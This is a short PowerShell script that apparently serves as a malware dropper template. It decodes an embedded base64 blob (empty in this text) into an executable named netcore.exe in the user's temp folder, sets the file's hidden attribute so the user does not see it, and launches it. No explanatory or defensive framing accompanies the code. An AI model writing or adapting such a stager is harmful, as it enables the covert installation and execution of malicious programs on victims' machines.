$base64String = @"

"@
$bytes = [Convert]::FromBase64String($base64String)
$outputPath = "$env:TEMP\netcore.exe"

[IO.File]::WriteAllBytes($outputPath, $bytes)

$attributes = [IO.File]::GetAttributes($outputPath)
[IO.File]::SetAttributes($outputPath, $attributes -bor [IO.FileAttributes]::Hidden)

Start-Process -FilePath $outputPath
